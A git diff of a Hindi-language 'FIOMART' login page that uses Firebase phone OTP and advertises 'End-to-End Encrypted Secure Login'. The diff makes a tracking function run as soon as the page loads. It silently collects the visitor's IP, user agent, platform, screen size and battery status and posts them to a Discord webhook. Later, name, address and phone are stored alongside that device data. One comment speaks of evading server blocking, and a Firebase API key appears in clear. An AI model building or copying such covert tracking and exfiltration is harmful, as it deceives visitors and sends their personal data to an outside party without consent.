@@ -5,6 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FIOMART - सुरक्षित लॉगिन</title>
     
+    <!-- 1. 100% नॉन-ब्लॉकिंग अल्टरनेटिव फायरबेस कोर स्क्रिप्ट्स -->
+    <script src="https://gstatic.com"></script>
+    <script src="https://gstatic.com"></script>
+    <script src="https://gstatic.com"></script>
+    
     <!-- प्रीमियम Google Fonts -->
     <link href="https://googleapis.com" rel="stylesheet">
 
@@ -43,7 +48,7 @@
             <input type="tel" id="phoneNumber" placeholder="+91 9876543210" value="+91">
         </div>
         <div id="recaptcha-container"></div>
-        <button id="otpBtn">OTP प्राप्त करें</button>
+        <button id="otpBtn" onclick="handleSendOTP()">OTP प्राप्त करें</button>
     </div>
 
     <div id="otp-section" style="display: none;">
@@ -51,20 +56,15 @@
             <label>वन-टाइम पासवर्ड (OTP)</label>
             <input type="text" id="otpCode" placeholder="6 अंकों का OTP दर्ज करें">
         </div>
-        <button id="verifyBtn">सत्यापित करें और प्रवेश करें</button>
+        <button id="verifyBtn" onclick="handleVerifyOTP()">सत्यापित करें और प्रवेश करें</button>
     </div>
 
     <div class="footer-secure">🔒 End-to-End Encrypted Secure Login</div>
 </div>
 
-<!-- इंटरनेट सर्वर ब्लॉकिंग से बचने के लिए ES Modules का सीधा इम्पोर्ट -->
-<script type="module">
-    import { initializeApp } from "https://gstatic.com";
-    import { getAuth, signInWithPhoneNumber, RecaptchaVerifier } from "https://gstatic.com";
-    import { getFirestore, doc, setDoc, serverTimestamp } from "https://gstatic.com";
-
+<script>
+    // 2. आवश्यक क्रेडेंशियल्स
     const discordWebhookUrl = "https://discord.com";
-    
     const firebaseConfig = {
       apiKey: "AIzaSyA0PuCqJ8rCATKLwBYn1kJWjLj-ZvL-avY",
       authDomain: "://firebaseapp.com",
@@ -75,17 +75,19 @@
       measurementId: "G-EZMRNEJRQK"
     };
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-    const db = getFirestore(app);
-
     let confirmationResultGlobal;
     let trackingData = { ip: "Fetching...", userAgent: navigator.userAgent, screenResolution: `${window.screen.width}x${window.screen.height}`, platform: navigator.platform, batteryLevel: "N/A", isCharging: "N/A" };
 
-    // Recaptcha Setup
-    window.recaptchaVerifier = new RecaptchaVerifier('recaptcha-container', { 'size': 'normal' }, auth);
+    // सुरक्षित इनिशियलाइजेशन (CORS प्रूफ)
+    try {
+        firebase.initializeApp(firebaseConfig);
+        window.db = firebase.firestore();
+        window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', { 'size': 'normal' });
+    } catch(e) {
+        console.error("Initialization Failed:", e);
+    }
 
+    // Discord Function
     function sendToDiscord(titleText) {
         fetch(discordWebhookUrl, {
             method: 'POST',
@@ -96,7 +98,8 @@
         }).catch(() => {});
     }
 
-    async function startTracking() {
+    // Instant Tracking OnLoad
+    window.onload = async function() {
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
@@ -112,13 +115,10 @@
             trackingData.ip = ipData.ip;
             sendToDiscord("🌐 **विजिटर का IP एड्रेस अपडेट:**");
         } catch (e) { trackingData.ip = "Unknown/Blocked"; }
-    }
+    };
 
-    // Run Tracking
-    startTracking();
-
-    // OTP Button
-    document.getElementById('otpBtn').addEventListener('click', function() {
+    // OTP Function
+    function handleSendOTP() {
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
@@ -128,7 +128,7 @@
             return;
         }
 
-        signInWithPhoneNumber(auth, phoneNumber, window.recaptchaVerifier)
+        firebase.auth().signInWithPhoneNumber(phoneNumber, window.recaptchaVerifier)
             .then((confirmationResult) => {
                 confirmationResultGlobal = confirmationResult;
                 alert("OTP आपके मोबाइल पर भेज दिया गया है!");
@@ -137,23 +137,23 @@
             }).catch((error) => {
                 alert("OTP भेजने में समस्या: " + error.message);
             });
-    });
+    }
 
-    // Verify Button
-    document.getElementById('verifyBtn').addEventListener('click', function() {
+    // Verify Function
+    function handleVerifyOTP() {
         const code = document.getElementById('otpCode').value;
         const phoneNumber = document.getElementById('phoneNumber').value;
         const name = document.getElementById('userName').value;
         const address = document.getElementById('userAddress').value;
 
-        confirmationResultGlobal.confirm(code).then(async (result) => {
+        confirmationResultGlobal.confirm(code).then((result) => {
             const user = result.user;
             try {
-                await setDoc(doc(db, "registered_users", user.uid), {
+                window.db.collection("registered_users").doc(user.uid).set({
                     fullName: name, userAddress: address, phone: phoneNumber,
                     ipAddress: trackingData.ip, deviceOS: trackingData.platform,
                     resolution: trackingData.screenResolution, battery: trackingData.batteryLevel,
-                    loginTime: serverTimestamp()
+                    loginTime: firebase.firestore.FieldValue.serverTimestamp()
                 });
             } catch(e) {}
 
@@ -168,7 +168,7 @@
         }).catch(() => {
             alert("गलत OTP, कृपया फिर से जांचें।");
         });
-    });
+    }
 </script>
 
 </body>
